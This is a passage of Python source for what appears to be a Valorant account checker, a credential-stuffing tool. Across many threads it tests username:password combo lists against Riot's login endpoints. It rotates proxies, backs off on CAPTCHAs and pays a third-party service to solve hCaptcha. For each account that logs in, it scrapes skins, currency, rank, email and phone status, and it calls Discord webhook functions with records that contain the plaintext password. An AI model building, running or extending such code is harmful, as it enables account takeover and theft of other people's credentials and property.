                "redirect_uri": "http://localhost/redirect",
                "response_type": "token id_token",
                "riot_patchline": None,
                "scope": "openid link ban lol_region account"
            }
            response = self.session.post(AUTH_URL, json=auth_payload, headers=self._generate_headers(), timeout=30)
            if response.status_code != 200:
                self._log(f"[{username}] \u274c Authorization init failed: HTTP {response.status_code}", "ERROR")
                return False, ""
            method_payload = {
                "apple": None, "campaign": None, "clientId": "riot-client", "code": None, "facebook": None,
                "gamecenter": None, "google": None, "keypair": None, "language": "en_US", "mockDeviceId": None,
                "mockPlatform": None, "multifactor": None, "nintendo": None, "platform": "windows",
                "playstation": None, "qrcode": None, "remember": False, "riot_identity": {"captcha": None, "password": None, "state": "auth", "username": None},
                "riot_identity_signup": None, "rso": None, "sdkVersion": "25.9.2.6606", "type": "auth", "xbox": None
            }
            method_response = self.session.post(LOGIN_URL, json=method_payload, headers=self._generate_headers(), timeout=30)
            if method_response.status_code != 200:
                self._log(f"[{username}] \u274c Auth method failed: HTTP {method_response.status_code}", "ERROR")
                return False, ""
            method_data = method_response.json()
            if method_data.get('type') == 'auth' and 'captcha' in method_data:
                self._log(f"[{username}] \ud83d\udea8 Captcha required in new flow", "INFO")
                captcha_data = method_data.get('captcha', {})
                hcaptcha_data = captcha_data.get('hcaptcha', {})
                if not hcaptcha_data:
                    self._log(f"[{username}] \u274c No hcaptcha data in response", "ERROR")
                    return False, ""
                
                import json as _json
                self.rqdata = hcaptcha_data.get('data')
                if not self.rqdata:
                    self._log(f"[{username}] \u274c No 'data' field in hcaptcha", "ERROR")
                    return False, ""
                
                # Extract websiteKey if available (per BroCapGPT docs for riotgames.com)
                # Try multiple possible field names
                website_key = (hcaptcha_data.get('key') or 
                              hcaptcha_data.get('sitekey') or 
                              hcaptcha_data.get('websiteKey') or
                              hcaptcha_data.get('site_key') or
                              captcha_data.get('key') or
                              captcha_data.get('sitekey'))
                
                if website_key:
                    # Store both rqdata and websiteKey as JSON string
                    captcha_info = {"rqdata": self.rqdata, "websiteKey": website_key}
                    return True, _json.dumps(captcha_info)
                else:
                    # Fallback to default if not in response
                    return True, self.rqdata
            else:
                self._log(f"[{username}] \u2705 No captcha required in new flow", "INFO")
                return True, "NO_CAPTCHA_REQUIRED"
        except Exception as e:
            self._log(f"[{username}] \u274c Auth init error: {type(e).__name__} - {str(e)[:100]}", "ERROR")
            return False, ""
    
    def authenticate(self, username: str, password: str, captcha_token: str) -> Tuple[bool, str, dict]:
        try:
            # Rate limit login requests across all threads
            with RiotAuth._login_lock:
                current_time = _time.time()
                time_since_last_login = current_time - RiotAuth._last_login_time
                if time_since_last_login < RiotAuth._min_login_interval:
                    sleep_time = RiotAuth._min_login_interval - time_since_last_login
                    _time.sleep(sleep_time)
                RiotAuth._last_login_time = _time.time()
            
            login_payload = {"campaign": None, "language": "en_US", "remember": False, "riot_identity": {"password": password, "state": None, "username": username}, "type": "auth"}
            if captcha_token and captcha_token != "NO_CAPTCHA_REQUIRED":
                if captcha_token.startswith("hcaptcha "):
                    login_payload["riot_identity"]["captcha"] = captcha_token
                else:
                    login_payload["riot_identity"]["captcha"] = f"hcaptcha {captcha_token}"
            else:
                login_payload["riot_identity"]["captcha"] = None
            response = self.session.put(LOGIN_URL, json=login_payload, headers=self._generate_headers(), timeout=30)
            if response.status_code == 429:
                # Rate limited by Riot - wait and retry once
                self._log(f"[{username}] ⚠️ Rate limited by Riot (HTTP 429), waiting 2s before retry...", "WARNING")
                _time.sleep(2)
                response = self.session.put(LOGIN_URL, json=login_payload, headers=self._generate_headers(), timeout=30)
            if response.status_code != 200:
                self._log(f"[{username}] \u274c Login failed: HTTP {response.status_code}", "ERROR")
                return False, "Login request failed", {}
            login_data = response.json()
            
            # Check for various account states
            login_type = login_data.get('type', '')
            
            # Check for errors first
            if login_type == 'error':
                error = login_data.get('error', 'unknown_error')
                error_str = str(error).lower()
                
                # Check for specific error types
                if 'auth_failure' in error_str or 'invalid_credentials' in error_str:
                    return False, "INCORRECT_LOGIN", {}
                elif 'rate_limited' in error_str or 'rate_limit' in error_str:
                    return False, "RATE_LIMITED", {}
                elif 'account_banned' in error_str or 'banned' in error_str:
                    return False, "BANNED", {}
                elif 'account_locked' in error_str or 'locked' in error_str or 'suspended' in error_str:
                    return False, "LOCKED", {}
                elif 'multifactor' in error_str or '2fa' in error_str:
                    return False, "2FA", {}
                else:
                    return False, f"ERROR: {error}", {}
            
            # Check for 2FA requirement
            if login_type == 'multifactor':
                return False, "2FA", {}
            
            # Check if account is banned/restricted in response
            if login_data.get('banned') or login_data.get('account_banned'):
                return False, "BANNED", {}
            
            # Check if account is locked
            if login_data.get('locked') or login_data.get('account_locked'):
                return False, "LOCKED", {}
            
            if login_type == 'success':
                login_token = login_data.get('success', {}).get('login_token')
                if not login_token:
                    return False, "No login token received", {}
                complete_success = self._complete_login(login_token)
                if not complete_success:
                    return False, "Failed to complete login", {}
                tokens_success, account_data = self._get_final_tokens(username)
                if not tokens_success:
                    return False, "Failed to get final tokens", {}
                return True, "Success", account_data
            elif login_type == 'auth':
                if 'error' in login_data and login_data['error']:
                    error = login_data['error']
                    error_str = str(error).lower()
                    
                    if 'auth_failure' in error_str or 'invalid_credentials' in error_str:
                        return False, "INCORRECT_LOGIN", {}
                    elif 'rate_limited' in error_str or 'rate_limit' in error_str:
                        return False, "RATE_LIMITED", {}
                    elif 'banned' in error_str:
                        return False, "BANNED", {}
                    elif 'locked' in error_str or 'suspended' in error_str:
                        return False, "LOCKED", {}
                    elif 'multifactor' in error_str or '2fa' in error_str:
                        return False, "2FA", {}
                    elif 'captcha' in error_str:
                        return False, "CAPTCHA_FAILED", {}
                    else:
                        return False, f"ERROR: {error}", {}
                
                if 'captcha' in login_data and login_data.get('captcha', {}).get('type'):
                    return False, "CAPTCHA_FAILED", {}
                
                auth_info = login_data.get('auth', {})
                if auth_info.get('auth_method') == 'riot_identity':
                    return False, "INCORRECT_LOGIN", {}
                return False, "INCORRECT_LOGIN", {}
            else:
                return False, "UNKNOWN_RESPONSE", {}
        except Exception as e:
            self._log(f"[{username}] \u274c Unexpected error: {str(e)[:100]}", "ERROR")
            return False, f"Unexpected error: {str(e)}", {}
    
    def _generate_nonce(self) -> str:
        import random, string
        return ''.join(random.choices(string.ascii_letters + string.digits, k=22))
    
    def _complete_login(self, login_token: str) -> bool:
        try:
            complete_payload = {"authentication_type": "RiotAuth", "code_verifier": "", "login_token": login_token, "persist_login": False}
            response = self.session.post(LOGIN_TOKEN_URL, json=complete_payload, headers=self._generate_headers(), timeout=30)
            return response.status_code == 204
        except Exception:
            return False
    
    def _get_final_tokens(self, username: str) -> Tuple[bool, dict]:
        try:
            final_auth_payload = {
                "acr_values": "", "claims": "", "client_id": "riot-client", "code_challenge": "", "code_challenge_method": "",
                "login_token": None, "nonce": self._generate_nonce(), "redirect_uri": "http://localhost/redirect",
                "response_type": "token id_token", "riot_patchline": None, "scope": "openid link ban lol_region account"
            }
            response = self.session.post(AUTH_URL, json=final_auth_payload, headers=self._generate_headers(), timeout=30)
            if response.status_code == 200:
                tokens_data = response.json()
                if tokens_data.get('type') == 'response':
                    uri = tokens_data.get('response', {}).get('parameters', {}).get('uri')
                    if not uri:
                        return False, {}
                    tokens = self._extract_tokens_from_uri(uri)
                    if not tokens:
                        return False, {}
                    self.access_token = tokens.get('access_token')
                    self.id_token = tokens.get('id_token')
                    if not self.access_token or not self.id_token:
                        return False, {}
                    entitlements_success = self._get_entitlements_token()
                    if not entitlements_success:
                        self._log(f"[{username}] Failed to get entitlements token", "ERROR")
                        return False, {}
                    account_data = self._extract_account_data()
                    return True, account_data
            return False, {}
        except Exception:
            return False, {}
    
    def _extract_tokens_from_uri(self, uri: str) -> dict:
        try:
            parsed = urlparse(uri)
            fragment = parsed.fragment
            if not fragment:
                return {}
            params = {}
            for param in fragment.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[key] = value
            return params
        except Exception:
            return {}
    
    def _get_entitlements_token(self) -> bool:
        try:
            headers = self._generate_headers()
            headers['Authorization'] = f'Bearer {self.access_token}'
            response = self.session.post(ENTITLEMENTS_URL, headers=headers, json={}, timeout=15)
            if response.status_code == 200:
                data = response.json()
                self.entitlements_token = data.get('entitlements_token')
                return self.entitlements_token is not None
            return False
        except Exception:
            return False
    
    def _extract_account_data(self) -> dict:
        data = {}
        if self.id_token:
            token_data = self._decode_token_data(self.id_token)
            if token_data:
                self.puuid = token_data.get('sub')
                data['puuid'] = self.puuid
                acct = token_data.get('acct', {})
                data['game_name'] = acct.get('game_name', '')
                data['tag_line'] = acct.get('tag_line', '')
                data['riot_id'] = f"{data['game_name']}#{data['tag_line']}"
                data['country'] = token_data.get('country', 'unknown')
                data['email_verified'] = token_data.get('email_verified', False)
                data['age'] = token_data.get('age', 0)
                claims = token_data.get('clm', [])
                region_found = False
                for claim in claims:
                    if isinstance(claim, str) and 'rgn_' in claim:
                        region_code = claim.replace('rgn_', '')
                        self.region = self._map_region_to_shard(region_code)
                        data['region'] = self.region
                        region_found = True
                        break
                if not region_found:
                    country = data.get('country', 'unknown').lower()
                    self.region = self._map_country_to_shard(country)
                    data['region'] = self.region
                if not self.region or self.region == 'none':
                    self.region = 'eu'
                    data['region'] = 'eu'
        return data
    
    def get_user_info(self) -> Optional[dict]:
        if not self.access_token:
            return None
        url = f"{self.base_auth_url}/userinfo"
        headers = {'Authorization': f'Bearer {self.access_token}', 'User-Agent': 'RiotGamesApi/25.9.2.6606 rso-auth (Windows;10;;Professional, x64) riot_client/0'}
        try:
            response = self.session.get(url, headers=headers)
            if response.status_code == 200:
                return response.json()
            else:
                self._log(f"User info fetch failed: HTTP {response.status_code}", "ERROR")
                return None
        except Exception as e:
            self._log(f"User info fetch error: {e}", "ERROR")
            return None
    
    def _map_region_to_shard(self, region_code: str) -> str:
        region_upper = region_code.upper()
        if region_upper.startswith('EU'):
            return 'eu'
        elif region_upper.startswith('NA'):
            return 'na'
        elif region_upper.startswith('LA'):
            return 'latam'
        elif region_upper.startswith('BR'):
            return 'br'
        elif region_upper.startswith('KR'):
            return 'kr'
        elif region_upper.startswith('AP') or region_upper.startswith('OC'):
            return 'ap'
        elif region_upper.startswith('TR'):
            return 'eu'
        else:
            return 'eu'
    
    def _map_country_to_shard(self, country: str) -> str:
        eu_countries = ['esp', 'fra', 'deu', 'ita', 'gbr', 'pol', 'nld', 'swe', 'nor', 'dnk', 'fin', 'aut', 'che', 'bel', 'prt', 'cze', 'hun', 'rou', 'bgr', 'hrv', 'svk', 'svn', 'est', 'lva', 'ltu', 'grc', 'cyp', 'mlt', 'lux', 'irl', 'rus', 'ukr', 'blr', 'srb', 'mne', 'bih', 'mkd', 'alb', 'xks', 'isl', 'tur']
        na_countries = ['usa', 'can']
        latam_countries = ['mex', 'arg', 'chl', 'col', 'per', 'ven', 'ecu', 'bol', 'pry', 'ury', 'cri', 'pan', 'gtm', 'hnd', 'slv', 'nic', 'dom', 'cub', 'jam', 'hti', 'bhs', 'bze', 'tto', 'grd', 'lca', 'vct', 'brb', 'atg']
        br_countries = ['bra']
        kr_countries = ['kor']
        ap_countries = ['jpn', 'chn', 'aus', 'nzl', 'sgp', 'tha', 'vnm', 'phl', 'mys', 'idn', 'ind', 'pak', 'bgd', 'lka', 'mmr', 'khm', 'lao', 'twn', 'hkg', 'mac', 'npl', 'btn', 'afg', 'mdv', 'brn', 'tls', 'png', 'fji']
        mena_countries = ['are', 'sau', 'kwt', 'qat', 'bhr', 'omn', 'jor', 'lbn', 'isr', 'pse', 'irq', 'syr', 'yem', 'egy', 'lby', 'tun', 'dza', 'mar', 'sdn', 'irn']
        country_lower = country.lower()
        if country_lower in eu_countries:
            return 'eu'
        elif country_lower in na_countries:
            return 'na'
        elif country_lower in latam_countries:
            return 'latam'
        elif country_lower in br_countries:
            return 'br'
        elif country_lower in kr_countries:
            return 'kr'
        elif country_lower in ap_countries:
            return 'ap'
        elif country_lower in mena_countries:
            return 'mena'
        else:
            return 'eu'
    
    def get_tokens(self) -> dict:
        return {'access_token': self.access_token, 'id_token': self.id_token, 'entitlements_token': self.entitlements_token, 'puuid': self.puuid, 'region': self.region}
    
    def get_rqdata(self) -> Optional[str]:
        return self.rqdata


# =========================
# core/checker.py
# =========================
import time as _time
import threading as _threading
from queue import Queue, Empty
from typing import Optional, Callable


class AccountChecker:
    def __init__(self, storage: MemoryStorage, proxy_manager: ProxyManager, captcha_solver: CaptchaSolver, logger: CheckerLogger, progress_callback: Optional[Callable] = None, use_captcha_solver: bool = True):
        self.storage = storage
        self.proxy_manager = proxy_manager
        self.captcha_solver = captcha_solver
        self.logger = logger
        self.progress_callback = progress_callback
        self.use_captcha_solver = use_captcha_solver
        self.is_running = False
        self.threads = []
        self.task_queue = Queue()
        self.stats_lock = _threading.Lock()
        self.load_lock = _threading.Lock()
        self.loading_flag = False
        self.stats = {'checked': 0, 'valid': 0, 'invalid': 0, 'errors': 0}
        # CAPTCHA backoff tracking
        self.captcha_trigger_count = 0
        self.last_captcha_time = 0
        self.captcha_backoff_lock = _threading.Lock()
        # CPM tracking for performance monitoring
        self.check_times = []  # List of timestamps for checks
        self.cpm_lock = _threading.Lock()
        self.start_time = None
        # Initialize silently
        self.name_resolver = ValorantNameResolver(log_callback=self.logger.log)
    
    def start_checking(self, thread_count: int = MAX_THREADS):
        if self.is_running:
            # Already running, skip silently
            return
        self.is_running = True
        # Reset CPM tracking
        with self.cpm_lock:
            self.check_times = []
            self.start_time = _time.time()
        self.logger.info(f"Started ({thread_count} threads)")
        self._load_combos_to_queue()
        
        for i in range(thread_count):
            thread = _threading.Thread(target=self._worker, daemon=True, name=f"Worker-{i+1}")
            thread.start()
            self.threads.append(thread)
    
    def stop_checking(self):
        if not self.is_running:
            return
        self.logger.info("Stopped")
        self.is_running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        self.threads.clear()
        while not self.task_queue.empty():
            try:
                self.task_queue.get_nowait()
                self.task_queue.task_done()
            except Empty:
                break
        self.logger.info("Checker stopped")
    
    def _load_combos_to_queue(self):
        if not self.is_running:
            return
        with self.load_lock:
            if self.loading_flag:
                return
            self.loading_flag = True
        try:
            claimed_combos = self.storage.claim_pending_combos(limit=50)
            if not claimed_combos:
                return
            for combo_id, username, password in claimed_combos:
                self.task_queue.put((combo_id, username, password))
            self.logger.info(f"Claimed and loaded {len(claimed_combos)} combos to queue")
        except Exception as e:
            self.logger.error(f"Error loading combos: {e}")
        finally:
            with self.load_lock:
                self.loading_flag = False
    
    def _worker(self):
        while self.is_running:
            try:
                combo_id, username, password = self.task_queue.get(timeout=1)
                # Add minimal delay between requests (only if needed to reduce CAPTCHA triggers)
                # Reduced delay for better CPM - delay is now optional and minimal
                if REQUEST_DELAY_MIN > 0:
                    delay_ms = random.uniform(REQUEST_DELAY_MIN, REQUEST_DELAY_MAX)
                    _time.sleep(delay_ms / 1000.0)
                
                self._check_account(combo_id, username, password)
                self.task_queue.task_done()
            except Empty:
                self._load_combos_to_queue()
                if self.task_queue.empty():
                    # Check if this is the last worker finishing
                    active_workers = sum(1 for t in self.threads if t.is_alive())
                    if active_workers <= 1:  # Only this worker is left
                        stats = self.storage.get_statistics()
                        if stats['pending'] == 0:
                            self.logger.success(f"\n🎉 FINISHED! Checked: {stats['checked']} | Valid: {stats['valid']} | Invalid: {stats['invalid']}\n")
                    break
                continue
            except Exception as e:
                # Log error but continue - never crash
                try:
                    self.logger.error(f"Worker error: {e}")
                except:
                    pass  # Even logging can fail, just continue
    
    def _check_account(self, combo_id: int, username: str, password: str):
        try:
            self.logger.checking_account(username)
        except:
            pass  # Continue even if logging fails
        
        last_failed_proxy = None
        for attempt in range(RETRY_ATTEMPTS):
            proxy = None
            auth = None
            try:
                # Apply exponential backoff if CAPTCHA was recently triggered
                self._apply_captcha_backoff()
                
                if self.proxy_manager.is_enabled():
                    if attempt == 0:
                        proxy = self.proxy_manager.get_next_proxy()
                    else:
                        proxy = self.proxy_manager.get_different_proxy(last_failed_proxy)
                auth = RiotAuth(proxy=proxy, log_callback=self.logger.log)
                init_success, rqdata = auth.initialize_auth(username)
                if not init_success or (not rqdata and rqdata != "NO_CAPTCHA_REQUIRED"):
                    try:
                        self.logger.error(f"[{username}] Failed to get captcha challenge")
                    except:
                        pass
                    self._update_stats('errors', increment_checked=True)
                    self.storage.mark_combo_failed(combo_id, 'auth_init_failed')
                    return
                captcha_token = None
                if rqdata == "NO_CAPTCHA_REQUIRED":
                    captcha_token = "NO_CAPTCHA_REQUIRED"
                    # Reset CAPTCHA backoff on successful no-CAPTCHA flow
                    with self.captcha_backoff_lock:
                        self.captcha_trigger_count = max(0, self.captcha_trigger_count - 1)
                else:
                    # Track CAPTCHA trigger for exponential backoff
                    with self.captcha_backoff_lock:
                        self.captcha_trigger_count += 1
                        self.last_captcha_time = _time.time()
                    
                    try:
                        self.logger.captcha_detected()
                    except:
                        pass
                    if not self.use_captcha_solver:
                        try:
                            self.logger.error(f"[{username}] Captcha required but solver disabled")
                        except:
                            pass
                        self._update_stats('errors', increment_checked=True)
                        self.storage.mark_combo_failed(combo_id, 'captcha_required')
                        return
                    # Check if API key is actually set
                    if not self.captcha_solver.api_key or not self.captcha_solver.api_key.strip():
                        try:
                            self.logger.error(f"[{username}] Captcha required but API key not set")
                        except:
                            pass
                        self._update_stats('errors', increment_checked=True)
                        self.storage.mark_combo_failed(combo_id, 'captcha_required')
                        return
                    try:
                        self.logger.solving_captcha()
                    except:
                        pass
                    # Parse captcha info - might be JSON with websiteKey or just rqdata string
                    import json as _json
                    website_key = None
                    rqdata_value = rqdata
                    try:
                        captcha_info = _json.loads(rqdata)
                        if isinstance(captcha_info, dict) and 'rqdata' in captcha_info:
                            rqdata_value = captcha_info['rqdata']
                            website_key = captcha_info.get('websiteKey')
                    except (ValueError, TypeError):
                        # Not JSON, use as-is (just rqdata string)
                        pass
                    
                    captcha_token = self._solve_captcha_with_retry(rqdata_value, website_key=website_key)
                    if not captcha_token:
                        try:
                            self.logger.captcha_failed()
                        except:
                            pass
                        self._update_stats('errors', increment_checked=True)
                        self.storage.mark_combo_failed(combo_id, 'captcha_failed')
                        return
                success, message, account_data = auth.authenticate(username, password, captcha_token)
                if not success:
                    # Check for specific account states from authentication
                    if message == "BANNED":
                        try:
                            self.logger.invalid_account(username, "BANNED")
                        except:
                            pass
                        self._update_stats('errors', increment_checked=True)
                        self.storage.mark_combo_failed(combo_id, 'banned')
                        return
                    elif message == "LOCKED":
                        try:
                            self.logger.invalid_account(username, "LOCKED")
                        except:
                            pass
                        self._update_stats('errors', increment_checked=True)
                        self.storage.mark_combo_failed(combo_id, 'locked')
                        return
                    elif message == "2FA":
                        try:
                            self.logger.invalid_account(username, "2FA Required")
                        except:
                            pass
                        self._update_stats('errors', increment_checked=True)
                        self.storage.mark_combo_failed(combo_id, '2fa')
                        return
                    else:
                        # Regular invalid credentials or other errors
                        try:
                            self.logger.invalid_account(username, message)
                        except:
                            pass
                        self._update_stats('invalid', increment_checked=True)
                        self.storage.mark_combo_failed(combo_id, 'invalid')
                        return
                self.logger.info(f"[{username}] Authentication successful! Fetching account details...")
                tokens = auth.get_tokens()
                user_info = auth.get_user_info()
                if user_info:
                    account_data['email_verified'] = user_info.get('email_verified', False)
                    account_data['phone_verified'] = user_info.get('phone_number_verified', False)
                    account_data['country'] = user_info.get('country', 'unknown')
                    account_data['username'] = user_info.get('preferred_username', username)
                    acct_info = user_info.get('acct', {})
                    if acct_info.get('game_name') and acct_info.get('tag_line'):
                        account_data['riot_id'] = f"{acct_info['game_name']}#{acct_info['tag_line']}"
                final_region = account_data.get('region') or tokens.get('region') or 'eu'
                api = ValorantAPI(access_token=tokens['access_token'], entitlements_token=tokens['entitlements_token'], puuid=tokens['puuid'], region=final_region, proxy=proxy, log_callback=self.logger.log, name_resolver=self.name_resolver)
                details = api.fetch_all_details()
                
                # Check if account has restrictions (ban/lock) - CRITICAL: Do this BEFORE marking as valid
                restriction_status = details.get('status', 'CLEAN')
                has_restrictions = details.get('has_restrictions', False)
                restrictions_list = details.get('restrictions', [])
                
                # Enhanced ban detection - check multiple sources
                is_banned = False
                is_locked = False
                
                # Method 1: Check restrictions API response
                if has_restrictions is True:  # Explicitly check for True (not None or False)
                    if restriction_status == 'BANNED':
                        is_banned = True
                    elif restriction_status == 'LOCKED':
                        is_locked = True
                elif restriction_status == 'BANNED':  # Even if has_restrictions is None/False, check status
                    is_banned = True
                elif restriction_status == 'LOCKED':
                    is_locked = True
                
                # Method 2: Check restrictions list directly (more reliable)
                if restrictions_list:
                    for restriction in restrictions_list:
                        r_type = str(restriction.get('restrictionType', '')).upper()
                        if 'BAN' in r_type:
                            is_banned = True
                        elif 'LOCK' in r_type or 'SUSPEND' in r_type:
                            is_locked = True
                
                # Method 3: Check penalty status from account details
                penalty_status = details.get('penalty_status', '')
                if penalty_status:
                    penalty_upper = str(penalty_status).upper()
                    if 'BAN' in penalty_upper:
                        is_banned = True
                    elif 'LOCK' in penalty_upper or 'SUSPEND' in penalty_upper:
                        is_locked = True
                
                # If account is banned or locked, mark it accordingly - NEVER mark as valid
                if is_banned:
                    try:
                        self.logger.invalid_account(username, "BANNED")
                    except:
                        pass
                    self._update_stats('errors', increment_checked=True)
                    self.storage.mark_combo_failed(combo_id, 'banned')
                    return
                elif is_locked:
                    try:
                        self.logger.invalid_account(username, "LOCKED")
                    except:
                        pass
                    self._update_stats('errors', increment_checked=True)
                    self.storage.mark_combo_failed(combo_id, 'locked')
                    return
                
                result = {
                    'status': 'valid',
                    'username': username,
                    'password': password,
                    'region': account_data.get('region', 'unknown'),
                    'riot_id': account_data.get('riot_id', ''),
                    'level': details.get('level', 0),
                    'vp': details.get('vp', 0),
                    'rd': details.get('rd', 0),
                    'skins': details.get('skins', 0),
                    'skin_details': details.get('skin_details', []),
                    'agents': details.get('agents', 0),
                    'rank': details.get('rank', 'Unranked'),
                    'email_verified': account_data.get('email_verified', False),
                    'phone_verified': account_data.get('phone_verified', False),
                    'phone_status': details.get('phone_status', 'UNKNOWN'),
                    'email_status': details.get('email_status', 'UNKNOWN'),
                    'country': get_country_name(account_data.get('country', 'unknown')),
                    'puuid': tokens['puuid'],
                    'buddies_count': details.get('buddies_count', 0),
                    'buddies': details.get('buddies', []),
                    'player_cards_count': details.get('player_cards_count', 0),
                    'player_cards': details.get('player_cards', []),
                    'sprays_count': details.get('sprays_count', 0),
                    'sprays': details.get('sprays', []),
                    'weapon_skins_count': details.get('weapon_skins_count', 0),
                    'weapon_skins': details.get('weapon_skins', []),
                    'skin_chromas_count': details.get('skin_chromas_count', 0),
                    'skin_chromas': details.get('skin_chromas', []),
                    'skin_levels_count': details.get('skin_levels_count', 0),
                    'skin_levels': details.get('skin_levels', []),
                    'total_matches': details.get('total_matches', 0),
                    'recent_matches': details.get('recent_matches', []),
                    'has_penalties': details.get('has_penalties', False),
                    'penalty_status': details.get('penalty_status', 'UNKNOWN'),
                    'penalties': details.get('penalties', []),
                    'has_restrictions': has_restrictions,
                    'restriction_status': restriction_status,
                    'restrictions': details.get('restrictions', []),
                    'kc': details.get('kc', 0)
                }
                self.storage.update_combo_result(combo_id, result)
                # Save files automatically by Region and Level next to the executable
                save_result_files_for_hit(result)
                # Append full capture details
                save_full_capture_details(result)
                
                # Send Discord webhook if enabled
                try:
                    send_discord_webhook(result)
                except Exception:
                    pass
                
                # Send to skins webhook if account has 1+ skins
                try:
                    send_skins_webhook_xshar2(result)
                except Exception:
                    pass
                
                details_str = (
                    f"Level: {result['level']} | VP: {result['vp']} | RD: {result['rd']} | "
                    f"Skins: {result['skins']} | All Skins: {result['weapon_skins_count']} | "
                    f"Buddies: {result['buddies_count']} | Cards: {result['player_cards_count']} | "
                    f"Sprays: {result['sprays_count']} | Chromas: {result['skin_chromas_count']} | "
                    f"Skin Levels: {result['skin_levels_count']} | Matches: {result['total_matches']} | "
                    f"Rank: {result['rank']} | Email: {result['email_status']} | "
                    f"Phone: {result['phone_status']} | Penalties: {result['penalty_status']} | "
                    f"Country: {result['country']}"
                )
                self.logger.valid_account(username, result['riot_id'], details_str)
                self._update_stats('valid', increment_checked=True)
                return
            except Exception as e:
                if proxy and self.proxy_manager.is_enabled():
                    last_failed_proxy = proxy
                    self.proxy_manager.mark_proxy_failed(proxy)
                if attempt < RETRY_ATTEMPTS - 1:
                    wait_time = RETRY_BACKOFF[attempt]
                    _time.sleep(wait_time)
                    continue
                self.logger.error(f"Error checking {username}: {e}")
                self._update_stats('errors', increment_checked=True)
                self.storage.mark_combo_failed(combo_id, 'error')
                return
            finally:
                if auth:
                    auth.session.close()
    
    def check_single_by_id(self, combo_id: int, username: str, password: str):
        """
        Run a single account check inline (no thread management).
        """
        prev_state = self.is_running
        try:
            self.is_running = True
            self._check_account(combo_id, username, password)
        finally:
            self.is_running = prev_state
    
    def _apply_captcha_backoff(self):
        """Apply exponential backoff if CAPTCHA was recently triggered"""
        with self.captcha_backoff_lock:
            if self.captcha_trigger_count > 0:
                # Calculate backoff time: base * (multiplier ^ count), capped at max
                backoff_time = min(
                    CAPTCHA_BACKOFF_INITIAL * (CAPTCHA_BACKOFF_BASE ** (self.captcha_trigger_count - 1)),
                    CAPTCHA_BACKOFF_MAX
                )
                # Only apply if recent CAPTCHA (within last 5 minutes)
                time_since_last = _time.time() - self.last_captcha_time
                if time_since_last < 300:  # 5 minutes
                    _time.sleep(backoff_time)
    
    def _solve_captcha_with_retry(self, rqdata: str, max_attempts: int = 2, website_key: Optional[str] = None) -> Optional[str]:
        for attempt in range(max_attempts):
            try:
                token = self.captcha_solver.solve_hcaptcha(rqdata, website_key=website_key)
                if token:
                    # Reset backoff on successful solve
                    with self.captcha_backoff_lock:
                        self.captcha_trigger_count = max(0, self.captcha_trigger_count - 2)
                    return token
                try:
                    self.logger.retrying_captcha()
                except:
                    pass
                _time.sleep(2)
            except Exception as e:
                try:
                    self.logger.retrying_captcha()
                except:
                    pass
                if attempt < max_attempts - 1:
                    _time.sleep(2)
        return None
    
    def _update_stats(self, stat_type: str, increment_checked: bool = False):
        with self.stats_lock:
            if increment_checked:
                self.stats['checked'] += 1
                # Track check time for CPM calculation
                with self.cpm_lock:
                    current_time = _time.time()
                    self.check_times.append(current_time)
                    # Keep only last 60 seconds of check times for rolling CPM
                    cutoff_time = current_time - 60
                    self.check_times = [t for t in self.check_times if t > cutoff_time]
            if stat_type in self.stats:
                self.stats[stat_type] += 1
            if self.progress_callback:
                stats_copy = self.stats.copy()
                # Calculate CPM
                with self.cpm_lock:
                    if self.check_times:
                        time_span = self.check_times[-1] - self.check_times[0] if len(self.check_times) > 1 else 1
                        stats_copy['cpm'] = int(len(self.check_times) / max(time_span / 60, 0.0167))  # At least 1 second
                    else:
                        stats_copy['cpm'] = 0
                self.progress_callback(stats_copy)


# =========================
# gui/main_window.py
# =========================
import os as _os
import json as _json2
import threading as _threading2
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTextEdit, QLabel, QTableWidget, QTableWidgetItem, QFileDialog, QSpinBox, QGroupBox, QLineEdit, QHeaderView, QMessageBox, QCheckBox, QMenu, QAction, QAbstractItemView, QDialog, QTabWidget, QScrollArea, QGridLayout
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QMetaType, pyqtSlot, QUrl
from PyQt5.QtGui import QFont, QColor, QPixmap
from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply


class CheckerThread(QThread):
    log_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(dict)
    finished_signal = pyqtSignal()
    
    def __init__(self, checker):
        super().__init__()
        self.checker = checker
        self.thread_count = 15
    
    def run(self):
        self.checker.start_checking(self.thread_count)
        while self.checker.is_running:
            self.msleep(100)
        self.finished_signal.emit()


class MainWindow(QMainWindow):
    scroll_logs_signal = pyqtSignal()
    
    def __init__(self, storage, proxy_manager, captcha_solver, logger, checker):
        super().__init__()
        try:
            QMetaType.type('QTextCursor')
        except:
            pass
        self.storage = storage
        self.proxy_manager = proxy_manager
        self.captcha_solver = captcha_solver
        self.logger = logger
        self.checker = checker
        self.checker_thread = None
        
        # Network manager for image loading (same as test script - must persist)
        self.network_manager = QNetworkAccessManager()
        # Store API config in the app directory to ensure it persists across runs
        self.config_file = get_file_path("api_config.json")
        # Load settings from config
        self.settings = self._load_settings()
        # Column mapping: column index -> settings key
        self.column_settings_map = {
            2: 'show_credentials',  # USERNAME
            3: 'show_credentials',  # RIOT ID (also credentials)
            4: 'show_level',        # LEVEL
            5: 'show_vp',            # VP
            6: 'show_rd',            # RD
            7: 'show_skins',         # SKINS
            8: 'show_skins',         # AGENTS (grouped with skins)
            9: 'show_rank',           # RANK
            10: 'show_email',        # EMAIL
            11: 'show_phone',        # PHONE
            12: 'show_matches',      # MATCHES
            13: 'show_penalties',    # PENALTIES
            14: 'show_country',      # COUNTRY
        }
        self.init_ui()
        self.apply_dark_theme()
        self.logger.log_callback = self.add_log_entry
        self.checker.progress_callback = self.update_stats
        self.scroll_logs_signal.connect(self._scroll_logs_to_bottom)
        self._load_api_key()
        self.storage.reset_checking_combos()
        self._load_existing_combos()
        # Apply column visibility settings
        self._apply_column_visibility()
    
    def init_ui(self):
        self.setWindowTitle("VALORANT Account Checker")
        self.setGeometry(100, 100, 1400, 800)
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout()
        central_widget.setLayout(main_layout)
        left_panel = self.create_left_panel()
        main_layout.addWidget(left_panel, stretch=1)
        right_panel = self.create_right_panel()
        main_layout.addWidget(right_panel, stretch=3)
    
    def create_left_panel(self):
        panel = QWidget()
        layout = QVBoxLayout()
        panel.setLayout(layout)
